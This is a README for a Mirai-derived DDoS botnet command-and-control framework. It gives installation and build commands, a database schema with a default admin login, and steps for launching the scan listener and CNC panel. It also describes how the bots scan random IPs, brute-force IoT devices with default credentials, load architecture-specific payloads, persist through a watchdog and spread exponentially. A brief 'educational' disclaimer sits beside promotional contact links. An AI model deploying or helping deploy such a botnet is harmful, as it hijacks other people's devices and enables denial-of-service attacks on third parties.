 # DDOS C2 Framework

This is a high-performance C2 (Command & Control) framework based on the Mirai source, optimized for modern Debian-based systems like Kali Linux and Ubuntu. It features enhanced scanning capabilities and multi-architecture support.

---

✨ Features
Multi-Architecture Support: Native support for various architectures including ARM, MIPS, x86, x64, and more.

High Performance C&C: Written in Go for efficient handling of thousands of concurrent bot connections.

Advanced Scanning: Optimized modules for GPON and Realtek vulnerabilities.

XOR Encryption: Secure table data using XOR-based encryption tools (enc.c).

Database Integration: Full MariaDB/MySQL integration for tracking user history and attack logs.

Binary Packing: Integrated UPX packing for reduced binary sizes and basic obfuscation.


## 🛠️ Installation (Debian-based: Kali/Ubuntu)

Run these commands in your terminal to set up the environment and dependencies:

### 1. Update & Install Tools
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install git gcc make go-sql-driver-mysql mariadb-server screen apache2 upx unzip -y

🛠️ Cross-Compiler (xcompile) Setup
To compile bots for different architectures (ARM, MIPS, etc.), you must set up the toolchains in /etc/xcompile:

Create Directory:

Bash
sudo mkdir -p /etc/xcompile
Extract Toolchains: Download and extract the compilers into the directory. Ensure the path structure is: /etc/xcompile/[arch]/bin/[arch]-gcc 
(check release section for compiler file)

Bash
cd /etc/xcompile
# Example: Extracting a toolchain
sudo tar -xvf cross-compiler-i486.tar.gz 
Set Permissions:

Bash
sudo chmod -R 755 /etc/xcompile

sudo systemctl start mariadb
sudo mysql -u root <<EOF
CREATE DATABASE IF NOT EXISTS shitnet;
USE shitnet;
CREATE TABLE history (id int(10) unsigned NOT NULL AUTO_INCREMENT, user_id int(10) unsigned NOT NULL, time_sent int(10) unsigned NOT NULL, duration int(10) unsigned NOT NULL, command text NOT NULL, max_bots int(11) DEFAULT '-1', PRIMARY KEY (id));
CREATE TABLE users (id int(10) unsigned NOT NULL AUTO_INCREMENT, username varchar(32) NOT NULL, password varchar(32) NOT NULL, duration_limit int(10) unsigned DEFAULT NULL, cooldown int(10) unsigned NOT NULL, wrc int(10) unsigned DEFAULT NULL, last_paid int(10) unsigned NOT NULL, max_bots int(11) DEFAULT '-1', admin int(10) unsigned DEFAULT '0', intvl int(10) unsigned DEFAULT '30', api_key text, PRIMARY KEY (id));
CREATE TABLE whitelist (id int(10) unsigned NOT NULL AUTO_INCREMENT, prefix varchar(16) DEFAULT NULL, netmask tinyint(3) unsigned DEFAULT NULL, PRIMARY KEY (id));
INSERT INTO users VALUES (NULL, 'admin', 'admin123', 0, 0, 0, 0, -1, 1, 30, '');
EOF


Build Project

chmod +x build.sh
./build.sh

Usage
Start Scan Listener:

Bash
screen -dmS scan go run scanListen.go
Start CNC Server:

Bash
screen -dmS cnc go run cnc/main.go
Connect to Panel:

Bash
telnet 127.0.0.1 3778

⚠️ Disclaimer
This project is for educational and research purposes only. The author is not responsible for any misuse. Use only on authorized systems.

1. Autonomous Scanning
Target Discovery: The bot binaries contain scanning modules (e.g., gpon80_scanner.c, realtek.c) that automatically generate random IPv4 addresses to scan.

Vulnerability Probing: Each bot independently probes these IPs for specific open ports (like 80, 8080, or 23) to find vulnerable IoT devices.

Brute-Forcing: If a login prompt is found, the bot automatically attempts to gain access using a built-in list of default credentials.

2. Automated Infection (The Loader)
Architecture Detection: Once a device is compromised, the scanner sends the target's info to the Loader.

Payload Delivery: The Loader automatically identifies the target's CPU architecture (ARM, MIPS, x86, etc.) and transfers the matching binary from your server.

Execution: The script automatically grants execution permissions (chmod +x) and runs the bot on the new device.

3. Self-Persistence and Reporting
Auto-Connection: Upon execution, the new bot automatically initiates a connection to your C2 server IP.

Watchdog Protection: A background "Watchdog" process automatically restarts the bot if it is killed or if the device reboots.

Exponential Growth: Each new bot immediately starts its own scanning process, leading to an automated, exponential increase in your total bot count.


https://www.facebook.com/sysmadbd
https://t.me/systemadminbd
